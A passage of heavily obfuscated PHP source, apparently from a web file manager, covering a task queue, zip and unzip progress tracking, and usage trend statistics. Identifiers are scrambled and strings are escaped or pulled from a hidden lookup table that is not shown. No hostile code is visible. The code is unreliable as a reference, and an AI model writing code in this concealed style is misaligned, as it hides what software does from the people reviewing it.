$ö„©ïÓ, $åíÏ®—, $™Òò”Ü¤) { $Ğ¿”âõæ =& $_SERVER[ñ÷§¡å]; $áäò™¨• =& $this->task; if ($™Òò”Ü¤ > 0) { $áäò™¨•[$Ğ¿”âõæ[799]] = $áäò™¨•[$Ğ¿”âõæ[799]] == 0 ? $åíÏ®— : $áäò™¨•[$Ğ¿”âõæ[799]]; $áäò™¨•[$Ğ¿”âõæ[1664]] = $™Òò”Ü¤; } else { if ($ö„©ïÓ > 0) { $áäò™¨•[$Ğ¿”âõæ[799]] = $áäò™¨•[$Ğ¿”âõæ[799]] == 0 ? $‹±ÇîğŸ : $áäò™¨•[$Ğ¿”âõæ[799]]; $áäò™¨•[$Ğ¿”âõæ[1664]] = $ö„©ïÓ; } } $this->update(); self::log("\160\x72\157\x67\162\x65\163\163\x48\164\x74\160\x3a\x64\157\x77\156\x3a{$ö„©ïÓ}\x2f{$‹±ÇîğŸ}\x3b\40\165\160\x6c\157\x61\x64\x3a{$™Òò”Ü¤}\57{$åíÏ®—}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\x6b\x51\165\145\165\x65\x4c\x65\156\147\164\x68"; const QUEUE_DATA = "\164\x61\x73\x6b\121\165\145\165\145\104\x61\x74\141"; public static $listData = false; public static function initTask() { } public static function add($ºÎ¤è¬—, $ôÅÛóí€ = array(), $Õ¥£î– = '', $‘Ù¿«´— = '') { $§»ê†êú =& $_SERVER[ñ÷§¡å]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($‘Ù¿«´— && array_find_by_field(self::$listData, $§»ê†êú[104], $‘Ù¿«´—)) { return !0; } self::$listData[] = array($§»ê†êú[273] => $ºÎ¤è¬—, $§»ê†êú[1744] => $ôÅÛóí€, $§»ê†êú[462] => $Õ¥£î–, $§»ê†êú[104] => $‘Ù¿«´—); return !0; } public static function addSubmit() { $Í‡ğù§ =& $_SERVER[ñ÷§¡å]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($Í‡ğù§[1745] . json_encode_force(array_to_keyvalue(self::$listData, $Í‡ğù§[12], $Í‡ğù§[462])), $Í‡ğù§[1746]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ê‡óªÇ, $ˆë‚÷¯Î = array(), $èŸ™½Õ = '', $áİ½¡ìä = '') { $ò‚‚Ê”û =& $_SERVER[ñ÷§¡å]; if (self::count() >= self::MAX_LENGTH) { return !1; } $£Áà¯Ã» = self::getAll(); if ($áİ½¡ìä && array_find_by_field($£Áà¯Ã», $ò‚‚Ê”û[104], $áİ½¡ìä)) { return !0; } $£Áà¯Ã»[] = array($ò‚‚Ê”û[273] => $ê‡óªÇ, $ò‚‚Ê”û[1744] => $ˆë‚÷¯Î, $ò‚‚Ê”û[462] => $èŸ™½Õ, $ò‚‚Ê”û[104] => $áİ½¡ìä); write_log($ò‚‚Ê”û[1745] . $èŸ™½Õ, $ò‚‚Ê”û[1746]); self::setAll($£Áà¯Ã»); return !0; } public static function run() { $¦™€›…¯ =& $_SERVER[ñ÷§¡å]; $«ñšóë‘ = self::getAll(); $š×„Ç‡µ = array_shift($«ñšóë‘); if (!$š×„Ç‡µ) { return !1; } self::setAll($«ñšóë‘); $è’˜ı¾ = timeFloat(); try { Hook::apply($š×„Ç‡µ[$¦™€›…¯[273]], $š×„Ç‡µ[$¦™€›…¯[1744]]); } catch (Exception $†“·² ¢) { } $‚œÑ­Ó‚ = number_format(timeFloat() - $è’˜ı¾, 3) . $¦™€›…¯[1679]; write_log($¦™€›…¯[1747] . $š×„Ç‡µ[$¦™€›…¯[462]] . $¦™€›…¯[1748] . $‚œÑ­Ó‚, $¦™€›…¯[1746]); return !0; } public static function count() { $şÈ½‘šà = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$şÈ½‘šà) { return 0; } return intval($şÈ½‘šà); } public static function getAll() { $ŞÀ•¥œà = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ŞÀ•¥œà) { return array(); } return $ŞÀ•¥œà; } public static function setAll($Ÿ…¼˜óÃ) { $µê›®‰½ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ÿ…¼˜óÃ), $µê›®‰½); Cache::set(self::QUEUE_DATA, $Ÿ…¼˜óÃ, $µê›®‰½); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ö ˜ş×Ç, $”›ŠÄ’ = 5.0) { if (!$ö ˜ş×Ç) { return; } $´ˆ€°‡Ë = Cache::get($ö ˜ş×Ç); if (!$´ˆ€°‡Ë || timeFloat() - floatVal($´ˆ€°‡Ë) >= $”›ŠÄ’) { Cache::set($ö ˜ş×Ç, timeFloat(), $”›ŠÄ’ * 10); return !0; } return !1; } public static function timeLimitCall($„Å”–µ, $÷¯…î£°, $ºİÙÅÀ®, $í·°¦¥§ = 5.0) { $õçˆıÍ =& $_SERVER[ñ÷§¡å]; if (!$„Å”–µ || !$÷¯…î£°) { return; } self::$asyncAdd = !0; $€Æû¿ÍÂ = $õçˆıÍ[1749]; $´Ş›½¾ì = Cache::get($€Æû¿ÍÂ, !0); $†©¸Ğ¼ò = array($õçˆıÍ[1750] => timeFloat(), $õçˆıÍ[1751] => timeFloat(), $õçˆıÍ[273] => $÷¯…î£°, $õçˆıÍ[1744] => $ºİÙÅÀ®, $õçˆıÍ[213] => $í·°¦¥§); if (is_array($´Ş›½¾ì[$„Å”–µ])) { $†©¸Ğ¼ò[$õçˆıÍ[1751]] = $´Ş›½¾ì[$„Å”–µ][$õçˆıÍ[1751]]; } if (is_array($´Ş›½¾ì[$„Å”–µ])) { if (timeFloat() - $´Ş›½¾ì[$„Å”–µ][$õçˆıÍ[1750]] < $†©¸Ğ¼ò[$õçˆıÍ[213]] * 0.3) { return; } $†©¸Ğ¼ò[$õçˆıÍ[1751]] = $´Ş›½¾ì[$„Å”–µ][$õçˆıÍ[1751]]; } $´Ş›½¾ì[$„Å”–µ] = $†©¸Ğ¼ò; Cache::set($€Æû¿ÍÂ, $´Ş›½¾ì, 60); Cache::removeMemory($€Æû¿ÍÂ); write_log($õçˆıÍ[1752] . $„Å”–µ . $õçˆıÍ[81] . $÷¯…î£°, $õçˆıÍ[1746]); } public static function timeLimitCallLoop() { $¤Ç–Ğâ =& $_SERVER[ñ÷§¡å]; $Í¶ºğ£² = array($¤Ç–Ğâ[1753]); $Å•’’Õ½ = in_array(strtolower(ACTION), $Í¶ºğ£²); if (!$Å•’’Õ½ && !self::$asyncAdd) { return; } $ä¤°ƒçï = $¤Ç–Ğâ[1749]; $ŞŞ¡†Ñ = Cache::get($ä¤°ƒçï, !0); if (!$ŞŞ¡†Ñ || count($ŞŞ¡†Ñ) <= 0) { return; } $¡µ¶¥œ¸ = !1; $™·Â×´× = timeFloat(); $ùù‰ÀŒú = array(); foreach ($ŞŞ¡†Ñ as $ôÖÉÓÅû => $‹óñáš) { if ($™·Â×´× - $‹óñáš[$¤Ç–Ğâ[1751]] > $‹óñáš[$¤Ç–Ğâ[213]]) { $¡µ¶¥œ¸ = !0; try { Hook::apply($‹óñáš[$¤Ç–Ğâ[273]], $‹óñáš[$¤Ç–Ğâ[1744]]); write_log($¤Ç–Ğâ[1754] . $ôÖÉÓÅû . $¤Ç–Ğâ[81] . $‹óñáš[$¤Ç–Ğâ[273]] . $¤Ç–Ğâ[1755] . ACTION, $¤Ç–Ğâ[1746]); } catch (Exception $ƒØµêâò) { } continue; } $ùù‰ÀŒú[$ôÖÉÓÅû] = $‹óñáš; } if (!$¡µ¶¥œ¸) { return; } if (!$ùù‰ÀŒú) { return Cache::remove($ä¤°ƒçï); } Cache::set($ä¤°ƒçï, $ùù‰ÀŒú, 60); Cache::removeMemory($ä¤°ƒçï); } public static function finished($„ı‘èÉ, $é¾Î¸òÍ) { $²¨ıí• =& $_SERVER[ñ÷§¡å]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($²¨ıí•[273] => $„ı‘èÉ, $²¨ıí•[1744] => $é¾Î¸òÍ); } private static function finishedRun() { $íÄö³¹Ÿ =& $_SERVER[ñ÷§¡å]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $º¡ÇóáÙ) { try { Hook::apply($º¡ÇóáÙ[$íÄö³¹Ÿ[273]], $º¡ÇóáÙ[$íÄö³¹Ÿ[1744]]); } catch (Exception $Şğ½Ş¥) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto EÂÍªœÏŸÉ; EÂÍªœÏŸÉ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $‹ìç®å¤ =& $_SERVER[ñ÷§¡å]; parent::startAfter(); Hook::bind($‹ìç®å¤[1756], array($this, $‹ìç®å¤[1757])); Hook::bind($‹ìç®å¤[1201], array($this, $‹ìç®å¤[1758])); $ÆÙğÈèÓ =& $this->task; $ÆÙğÈèÓ[$‹ìç®å¤[1759]] = $‹ìç®å¤[1206]; if (!$ÆÙğÈèÓ[$‹ìç®å¤[1562]]) { $ÆÙğÈèÓ[$‹ìç®å¤[1562]] = LNG($‹ìç®å¤[1760]); } } protected function endAfter() { $ÒÅÜÀä° =& $_SERVER[ñ÷§¡å]; parent::endAfter(); Hook::unbind($ÒÅÜÀä°[1756], array($this, $ÒÅÜÀä°[1757])); Hook::unbind($ÒÅÜÀä°[1201], array($this, $ÒÅÜÀä°[1758])); } public function updateAfter() { $ªÕ–¯äî =& $_SERVER[ñ÷§¡å]; $í†Ş·å£ =& $this->task; if (!$í†Ş·å£[$ªÕ–¯äî[799]] || !$í†Ş·å£[$ªÕ–¯äî[776]]) { return; } if ($í†Ş·å£[$ªÕ–¯äî[1759]] == $ªÕ–¯äî[1206]) { $€Æ½å = 0; if ($í†Ş·å£[$ªÕ–¯äî[1714]]) { $€Æ½å = $í†Ş·å£[$ªÕ–¯äî[1715]] / $í†Ş·å£[$ªÕ–¯äî[1714]]; } $í†Ş·å£[$ªÕ–¯äî[1665]] = $€Æ½å * 0.3; } else { if ($í†Ş·å£[$ªÕ–¯äî[1759]] == $ªÕ–¯äî[322]) { $€Æ½å = $í†Ş·å£[$ªÕ–¯äî[1664]] / $í†Ş·å£[$ªÕ–¯äî[799]]; $í†Ş·å£[$ªÕ–¯äî[1665]] = 0.3 + $€Æ½å * 0.4; } else { if ($í†Ş·å£[$ªÕ–¯äî[1759]] == $ªÕ–¯äî[117]) { $ÔÊÕ³Üà = 0; if ($í†Ş·å£[$ªÕ–¯äî[1716]] == $ªÕ–¯äî[117]) { $ÔÊÕ³Üà = $í†Ş·å£[$ªÕ–¯äî[1715]]; } $€Æ½å = ($í†Ş·å£[$ªÕ–¯äî[1719]] + $ÔÊÕ³Üà) / $í†Ş·å£[$ªÕ–¯äî[776]]; $í†Ş·å£[$ªÕ–¯äî[1665]] = 0.3 + 0.4 + $€Æ½å * 0.3; } } } if ($í†Ş·å£[$ªÕ–¯äî[1665]] > 0) { $œÆ˜•¦Õ = timeFloat() - $í†Ş·å£[$ªÕ–¯äî[1667]] - $í†Ş·å£[$ªÕ–¯äî[1670]]; $í†Ş·å£[$ªÕ–¯äî[1671]] = $œÆ˜•¦Õ * (1 - $í†Ş·å£[$ªÕ–¯äî[1665]]) / $í†Ş·å£[$ªÕ–¯äî[1665]]; } } public function addFile($í¹ŒÍÑÍ) { $’ÎíÙÓ =& $_SERVER[ñ÷§¡å]; $£Ğ€ß =& $this->task; $—šÈ°Ã = IO::info($í¹ŒÍÑÍ); $£Ğ€ß[$’ÎíÙÓ[1712]] = $—šÈ°Ã[$’ÎíÙÓ[32]]; $£Ğ€ß[$’ÎíÙÓ[1714]] = $—šÈ°Ã[$’ÎíÙÓ[86]]; $£Ğ€ß[$’ÎíÙÓ[1715]] = 0; $£Ğ€ß[$’ÎíÙÓ[1071]] = $’ÎíÙÓ[1735]; $£Ğ€ß[$’ÎíÙÓ[1716]] = $’ÎíÙÓ[1206]; $£Ğ€ß[$’ÎíÙÓ[776]] = $—šÈ°Ã[$’ÎíÙÓ[86]]; $£Ğ€ß[$’ÎíÙÓ[799]] = 1; $Öè³±ÄÇ = 0; $£Ğ€ß[$’ÎíÙÓ[1723]] = array($’ÎíÙÓ[1724] => $Öè³±ÄÇ + 1, $’ÎíÙÓ[429] => $—šÈ°Ã[$’ÎíÙÓ[32]], $’ÎíÙÓ[94] => $—šÈ°Ã[$’ÎíÙÓ[94]], $’ÎíÙÓ[528] => $—šÈ°Ã[$’ÎíÙÓ[528]] ? $—šÈ°Ã[$’ÎíÙÓ[528]] : $—šÈ°Ã[$’ÎíÙÓ[94]]); $this->update(); } public function unzipAfter($•Üî°»ï) { $¼›ø«áê =& $_SERVER[ñ÷§¡å]; $²µ†ıÈ =& $this->task; $²µ†ıÈ[$¼›ø«áê[1759]] = $¼›ø«áê[117]; $Å¡ÏíŞé = IO::infoWithChildren($•Üî°»ï); $Ü¢ÍßòÌ = 0; $²µ†ıÈ[$¼›ø«áê[1723]] = array($¼›ø«áê[1724] => $Ü¢ÍßòÌ + 1, $¼›ø«áê[429] => $Å¡ÏíŞé[$¼›ø«áê[32]], $¼›ø«áê[94] => $Å¡ÏíŞé[$¼›ø«áê[94]], $¼›ø«áê[528] => $Å¡ÏíŞé[$¼›ø«áê[528]] ? $Å¡ÏíŞé[$¼›ø«áê[528]] : $Å¡ÏíŞé[$¼›ø«áê[94]]); if ($Å¡ÏíŞé[$¼›ø«áê[33]] == $¼›ø«áê[209]) { $²µ†ıÈ[$¼›ø«áê[799]] = 1; } else { $²µ†ıÈ[$¼›ø«áê[799]] = $Å¡ÏíŞé[$¼›ø«áê[89]][$¼›ø«áê[87]]; } $²µ†ıÈ[$¼›ø«áê[1071]] = $¼›ø«áê[12]; $²µ†ıÈ[$¼›ø«áê[1716]] = 0; $²µ†ıÈ[$¼›ø«áê[1664]] = 0; $²µ†ıÈ[$¼›ø«áê[1714]] = 0; $²µ†ıÈ[$¼›ø«áê[1715]] = 0; $²µ†ıÈ[$¼›ø«áê[1712]] = $¼›ø«áê[12]; $²µ†ıÈ[$¼›ø«áê[1719]] = 0; $²µ†ıÈ[$¼›ø«áê[776]] = $Å¡ÏíŞé[$¼›ø«áê[86]]; $this->update(); self::log($¼›ø«áê[1761] . json_encode(array($²µ†ıÈ, $Å¡ÏíŞé))); } public function nameParse($µ‰ü˜óÔ) { $‘…„÷ˆï =& $_SERVER[ñ÷§¡å]; $ï¬­í»É =& $this->task; if ($ï¬­í»É[$‘…„÷ˆï[1759]] == $‘…„÷ˆï[1206]) { $ï¬­í»É[$‘…„÷ˆï[1759]] = $‘…„÷ˆï[322]; $ï¬­í»É[$‘…„÷ˆï[1719]] = 0; $ï¬­í»É[$‘…„÷ˆï[776]] = 0; } $á·›Ï¶ = get_path_this($µ‰ü˜óÔ); if (strstr($á·›Ï¶, $‘…„÷ˆï[10])) { $ï¬­í»É[$‘…„÷ˆï[1664]] += 1; $ï¬­í»É[$‘…„÷ˆï[799]] += 1; } $ï¬­í»É[$‘…„÷ˆï[1712]] = $µ‰ü˜óÔ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¹šÒ‚«¤ =& $_SERVER[ñ÷§¡å]; parent::startAfter(); Hook::bind($¹šÒ‚«¤[1762], array($this, $¹šÒ‚«¤[1757])); $à“ñª± =& $this->task; $à“ñª±[$¹šÒ‚«¤[1759]] = $¹šÒ‚«¤[1206]; if (!$à“ñª±[$¹šÒ‚«¤[1562]]) { $à“ñª±[$¹šÒ‚«¤[1562]] = LNG($¹šÒ‚«¤[1763]); } } protected function endAfter() { $¹Í¨Ÿİ =& $_SERVER[ñ÷§¡å]; parent::endAfter(); Hook::unbind($¹Í¨Ÿİ[1762], array($this, $¹Í¨Ÿİ[1757])); } public function updateAfter() { $¼åÅ¤Õ =& $_SERVER[ñ÷§¡å]; $“Ö”‚œª =& $this->task; if (!$“Ö”‚œª[$¼åÅ¤Õ[799]] || !$“Ö”‚œª[$¼åÅ¤Õ[776]]) { return; } if ($“Ö”‚œª[$¼åÅ¤Õ[1759]] == $¼åÅ¤Õ[1206]) { $şÓ­Ô×Ö = $“Ö”‚œª[$¼åÅ¤Õ[1715]]; if ($“Ö”‚œª[$¼åÅ¤Õ[1716]] != $¼åÅ¤Õ[1206]) { $şÓ­Ô×Ö = 0; } $É£Ë˜Ş = ($“Ö”‚œª[$¼åÅ¤Õ[1719]] + $şÓ­Ô×Ö) / $“Ö”‚œª[$¼åÅ¤Õ[776]]; $“Ö”‚œª[$¼åÅ¤Õ[1665]] = $É£Ë˜Ş * 0.3; } else { if ($“Ö”‚œª[$¼åÅ¤Õ[1759]] == $¼åÅ¤Õ[322]) { $É£Ë˜Ş = $“Ö”‚œª[$¼åÅ¤Õ[1664]] / $“Ö”‚œª[$¼åÅ¤Õ[799]]; $“Ö”‚œª[$¼åÅ¤Õ[1665]] = 0.3 + $É£Ë˜Ş * 0.5; } else { if ($“Ö”‚œª[$¼åÅ¤Õ[1759]] == $¼åÅ¤Õ[117]) { $É£Ë˜Ş = 0; if ($“Ö”‚œª[$¼åÅ¤Õ[1714]]) { $É£Ë˜Ş = $“Ö”‚œª[$¼åÅ¤Õ[1715]] / $“Ö”‚œª[$¼åÅ¤Õ[1714]]; } $“Ö”‚œª[$¼åÅ¤Õ[1665]] = 0.3 + 0.5 + $É£Ë˜Ş * 0.2; } } } if ($“Ö”‚œª[$¼åÅ¤Õ[1665]] > 0) { $Û®Âœùş = timeFloat() - $“Ö”‚œª[$¼åÅ¤Õ[1667]] - $“Ö”‚œª[$¼åÅ¤Õ[1670]]; $“Ö”‚œª[$¼åÅ¤Õ[1671]] = $Û®Âœùş * (1 - $“Ö”‚œª[$¼åÅ¤Õ[1665]]) / $“Ö”‚œª[$¼åÅ¤Õ[1665]]; } } public function copyFileStart($ˆ™éÛ€í, $—ñÚşéã, $Ë¡ºÀ†é, $ƒÏ»”‰, $øÜÒ‚äÙ, $Ìá¥‰Ï•) { $‡«§…»¿ =& $_SERVER[ñ÷§¡å]; parent::copyFileStart($ˆ™éÛ€í, $—ñÚşéã, $Ë¡ºÀ†é, $ƒÏ»”‰, $øÜÒ‚äÙ, $Ìá¥‰Ï•); $²œÂ·ô¾ =& $this->task; if ($²œÂ·ô¾[$‡«§…»¿[1759]] == $‡«§…»¿[322]) { $²œÂ·ô¾[$‡«§…»¿[1759]] = $‡«§…»¿[117]; } $this->update(); } public function copyFileEnd($×‹”üÔû, $äÅÖÉ¼Ñ, $æ„ûäÕ, $êìí“, $Š“µÌË, $êÄåĞ’Ò) { $ÇÃÒ’–’ =& $_SERVER[ñ÷§¡å]; $ŠãäÊ’Ê =& $this->task; $ŠãäÊ’Ê[$ÇÃÒ’–’[1715]] = $ŠãäÊ’Ê[$ÇÃÒ’–’[1714]]; $ŠãäÊ’Ê[$ÇÃÒ’–’[1719]] += $ŠãäÊ’Ê[$ÇÃÒ’–’[1714]]; $ŠãäÊ’Ê[$ÇÃÒ’–’[1716]] = $ÇÃÒ’–’[12]; $this->update(); } public function nameParse($›—«ÉØÑ) { $ı‹‡¢õ‚ =& $_SERVER[ñ÷§¡å]; $Â«è×°ö =& $this->task; if ($Â«è×°ö[$ı‹‡¢õ‚[1664]] < $Â«è×°ö[$ı‹‡¢õ‚[799]]) { $ıÁÂ¥™™ = get_path_this($›—«ÉØÑ); if (strstr($ıÁÂ¥™™, $ı‹‡¢õ‚[10])) { $Â«è×°ö[$ı‹‡¢õ‚[1664]] += 1; } } if ($Â«è×°ö[$ı‹‡¢õ‚[1759]] == $ı‹‡¢õ‚[1206]) { $Â«è×°ö[$ı‹‡¢õ‚[1759]] = $ı‹‡¢õ‚[322]; } $Â«è×°ö[$ı‹‡¢õ‚[1712]] = $›—«ÉØÑ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¾ ™äœ) { $¾ºº‰Î´ =& $_SERVER[ñ÷§¡å]; $†Ë¦Ú’Ğ = array($¾ºº‰Î´[609] => array($¾ºº‰Î´[33] => $¾ºº‰Î´[1764], $¾ºº‰Î´[282] => array($¾ºº‰Î´[234], $¾ºº‰Î´[778], $¾ºº‰Î´[1765], $¾ºº‰Î´[1766])), $¾ºº‰Î´[1767] => array($¾ºº‰Î´[33] => $¾ºº‰Î´[1768], $¾ºº‰Î´[282] => array($¾ºº‰Î´[234], $¾ºº‰Î´[776], $¾ºº‰Î´[1769], $¾ºº‰Î´[1770], $¾ºº‰Î´[1771]))); if (!isset($†Ë¦Ú’Ğ[$¾ ™äœ])) { return !1; } $this->optionType = $†Ë¦Ú’Ğ[$¾ ™äœ][$¾ºº‰Î´[33]]; $this->field = $†Ë¦Ú’Ğ[$¾ ™äœ][$¾ºº‰Î´[282]]; return !0; } public function listData($şÚÕšĞà = false, $µıøöşÚ = "\x6d\x6f\144\151\146\x79\x54\x69\155\145", $¼ÍïŸ®ø = false) { return parent::listData($şÚÕšĞà, $µıøöşÚ, $¼ÍïŸ®ø); } public function trendList($î¼º¬ı½) { $‘Ò’µÔä =& $_SERVER[ñ÷§¡å]; $’Ïàƒ—Å = $this->listData(); if ($’Ïàƒ—Å) { $‘Ğğáí‘ = end($’Ïàƒ—Å); $ æêä—ó = date($‘Ò’µÔä[1772], strtotime($‘Ò’µÔä[1773])); if ($‘Ğğáí‘[$‘Ò’µÔä[234]] == $ æêä—ó) { return $’Ïàƒ—Å; } $–ü³¶˜ = strtotime($‘Ğğáí‘[$‘Ò’µÔä[234]]); } if (!isset($–ü³¶˜)) { $•øó¶óß = $î¼º¬ı½ == $‘Ò’µÔä[609] ? $‘Ò’µÔä[544] : $‘Ò’µÔä[838]; $–ü³¶˜ = Model($•øó¶óß)->min($‘Ò’µÔä[210]); } $§ÛöÊìœ = $‘Ò’µÔä[1774] . ucfirst($î¼º¬ı½); $˜µÅ¯ºË = $this->dateList($–ü³¶˜); foreach ($˜µÅ¯ºË as $ æêä—ó) { $this->{$§ÛöÊìœ}($ æêä—ó); } return $this->listData(); } private function dateList($Ç…™ÀŸö) { $ŞŒû÷„« =& $_SERVER[ñ÷§¡å]; $÷·îÄìá = $Ç…™ÀŸö; $Á¥Øõ€‘ = strtotime($ŞŒû÷„«[1773]); $Ôè™’”… = array(); while ($÷·îÄìá <= $Á¥Øõ€‘) { $Ôè™’”…[] = date($ŞŒû÷„«[1772], $÷·îÄìá); $÷·îÄìá = strtotime($ŞŒû÷„«[1775], $÷·îÄìá); } return $Ôè™’”…; } public function _recordUser($ş¬Íì‘š = '') { $×œê¦ª˜ =& $_SERVER[ñ÷§¡å]; $èßç©š» = strtotime(date($×œê¦ª˜[1776], strtotime($ş¬Íì‘š))); $µíÑ£Ş = strtotime(date($×œê¦ª˜[1777], strtotime($ş¬Íì‘š))); $ØÃ›ğ¸œ = array($×œê¦ª˜[210] => array($×œê¦ª˜[1020], $µíÑ£Ş)); $Ó«½Îß = Model($×œê¦ª˜[544])->where($ØÃ›ğ¸œ)->count($×œê¦ª˜[1663]); $ØÃ›ğ¸œ[$×œê¦ª˜[210]] = array($×œê¦ª˜[342], array($èßç©š», $µíÑ£Ş)); $ïÍ¥ò¥ = Model($×œê¦ª˜[544])->where($ØÃ›ğ¸œ)->count($×œê¦ª˜[1663]); $ØÃ›ğ¸œ[$×œê¦ª˜[33]] = $×œê¦ª˜[1778]; $ƒú«¥ôè = Model($×œê¦ª˜[1779])->where($ØÃ›ğ¸œ)->count($×œê¦ª˜[1780]); $Ó°ù…Ò¹ = array($×œê¦ª˜[234] => $ş¬Íì‘š, $×œê¦ª˜[778] => (int) $Ó«½Îß, $×œê¦ª˜[1765] => (int) $ïÍ¥ò¥, $×œê¦ª˜[1766] => (int) $ƒú«¥ôè); return $this->insert($Ó°ù…Ò¹); } public function _recordStore($Èòßšİ = '') { $Ÿœ¯Î‚¾ =& $_SERVER[ñ÷§¡å]; $’©ºÃ¨° = strtotime(date($Ÿœ¯Î‚¾[1777], strtotime($Èòßšİ))); $‘‰§¬ÙÇ = array($Ÿœ¯Î‚¾[210] => array($Ÿœ¯Î‚¾[1020], $’©ºÃ¨°)); $„´àœÕ× = Model($Ÿœ¯Î‚¾[480])->where($‘‰§¬ÙÇ)->sum($Ÿœ¯Î‚¾[86]); $‘‰§¬ÙÇ[$Ÿœ¯Î‚¾[419]] = 0; $Œ’š“× = Model($Ÿœ¯Î‚¾[838])->where($‘‰§¬ÙÇ)->sum($Ÿœ¯Î‚¾[86]); $‘‰§¬ÙÇ[$Ÿœ¯Î‚¾[420]] = 1; $ú°¿×ÉÄ = Model($Ÿœ¯Î‚¾[838])->where($‘‰§¬ÙÇ)->sum($Ÿœ¯Î‚¾[86]); $‘‰§¬ÙÇ[$Ÿœ¯Î‚¾[420]] = 2; $×ªñø¾Ğ = Model($Ÿœ¯Î‚¾[838])->where($‘‰§¬ÙÇ)->sum($Ÿœ¯Î‚¾[86]); $ğëºÂÒñ = array($Ÿœ¯Î‚¾[234] => $Èòßšİ, $Ÿœ¯Î‚¾[776] => (int) $Œ’š“×, $Ÿœ¯Î‚¾[1769] => (int) $„´àœÕ×, $Ÿœ¯Î‚¾[1770] => (int) $ú°¿×ÉÄ, $Ÿœ¯Î‚¾[1771] => (int) $×ªñø¾Ğ); return $this->insert($ğëºÂÒñ); } public function trend($ŞÆ‚İËÉ, $—øß ”…) { $öŸÒ†î× =& $_SERVER[ñ÷§¡å]; if (!$this->init($ŞÆ‚İËÉ)) { return !1; } $ëäîö£… = $this->trendList($ŞÆ‚İËÉ); if ($ëäîö£… && $—øß ”… != $öŸÒ†î×[1636]) { $ÃÑ€ÀÏ˜ = $ëäîö£…[0][$öŸÒ†î×[234]]; $’¾ç¬ŠÀ = $this->validDate($—øß ”…, $ÃÑ€ÀÏ˜); $Ã–¤¡ = array(); $êíÔè¯ = array_to_keyvalue($ëäîö£…, $öŸÒ†î×[234]); foreach ($’¾ç¬ŠÀ as $ ÏÉ´éà) { if (isset($êíÔè¯[$ ÏÉ´éà])) { $‘à÷Ÿ†ó = $êíÔè¯[$ ÏÉ´éà]; } else { $‘à÷Ÿ†ó = end($ëäîö£…); $‘à÷Ÿ†ó[$öŸÒ†î×[234]] = $ ÏÉ´éà; if ($ŞÆ‚İËÉ == $öŸÒ†î×[609]) { $‘à÷Ÿ†ó[$öŸÒ†î×[1765]] = $‘à÷Ÿ†ó[$öŸÒ†î×[1766]] = 0; } } $Ã–¤¡[] = $‘à÷Ÿ†ó; } $ëäîö£… = $Ã–¤¡; } $ßâÒŸøŠ = array($öŸÒ†î×[609] => array($öŸÒ†î×[778] => LNG($öŸÒ†î×[1781]), $öŸÒ†î×[1765] => LNG($öŸÒ†î×[1782]), $öŸÒ†î×[1766] => LNG($öŸÒ†î×[1783])), $öŸÒ†î×[1767] => array($öŸÒ†î×[776] => LNG($öŸÒ†î×[1784]), $öŸÒ†î×[1769] => LNG($öŸÒ†î×[1785]), $öŸÒ†î×[1770] => LNG($öŸÒ†î×[1786]), $öŸÒ†î×[1771] => LNG($öŸÒ†î×[1787]))); $ò¦ÕØá™ = array($öŸÒ†î×[609] => $öŸÒ†î×[1788], $öŸÒ†î×[1767] => $öŸÒ†î×[86]); if (empty($ëäîö£…)) { $ ÏÉ´éà = date($öŸÒ†î×[1772], strtotime($öŸÒ†î×[1773])); $ÑÆ§¢ÀÄ = array($öŸÒ†î×[234] => $ ÏÉ´éà); foreach ($ßâÒŸøŠ[$ŞÆ‚İËÉ] as $Õ ¯Å‰ => $­”•øªæ) { $ÑÆ§¢ÀÄ[$Õ ¯Å‰] = 0; } $ëäîö£…[] = $ÑÆ§¢ÀÄ; } $ÙÅÏ¥ÎÍ = array(); foreach ($ëäîö£… as $­”•øªæ) { if ($ŞÆ‚İËÉ == $öŸÒ†î×[1767] && $­”•øªæ[$öŸÒ†î×[1769]] > $­”•øªæ[$öŸÒ†î×[776]]) { $­”•øªæ[$öŸÒ†î×[1769]] = $­”•øªæ[$öŸÒ†î×[776]]; } foreach ($ßâÒŸøŠ[$ŞÆ‚İËÉ] as $Õ ¯Å‰ => $ñ¦û•º) { $‘à÷Ÿ†ó = array($öŸÒ†î×[234] => $­”•øªæ[$öŸÒ†î×[234]], $öŸÒ†î×[1562] => $ñ¦û•º); $‘à÷Ÿ†ó[$ò¦ÕØá™[$ŞÆ‚İËÉ]] = isset($­”•øªæ[$Õ ¯Å‰]) ? $­”•øªæ[$Õ ¯Å‰] : 0; $ÙÅÏ¥ÎÍ[] = $‘à÷Ÿ†ó; } } return $ÙÅÏ¥ÎÍ; } public function validDate($œ ¸Ø»›, $í´£šúä) { $à½®Ã =& $_SERVER[ñ÷§¡å]; $”¹“ÕÆ¸ = date($à½®Ã[1772], strtotime($à½®Ã[1773])); $—¾Ó½šµ = array($”¹“ÕÆ¸); switch ($œ ¸Ø»›) { case $à½®Ã[1643]: $è™¼Ÿú = mktime(0, 0, 0, date($à½®Ã[1789]), date($à½®Ã[1382]) - date($à½®Ã[1445]) + 7 - 7, date($à½®Ã[1790])); $µ°”Â£´ = 0; do { $™æô°ö” = date($à½®Ã[1772], $è™¼Ÿú - 3600 * 24 * 7 * $µ°”Â£´); $—¾Ó½šµ[] = $™æô°ö”; $µ°”Â£´++; } while ($í´£šúä < $™æô°ö”); break; case $à½®Ã[1641]: $µ°”Â£´ = 1; do { $îÏÀğ”å = date($à½®Ã[1791], strtotime("\x2d\40{$µ°”Â£´}\40\155\157\x6e\x74\x68\163")); $—¾Ó½šµ[] = $îÏÀğ”å; $µ°”Â£´++; } while 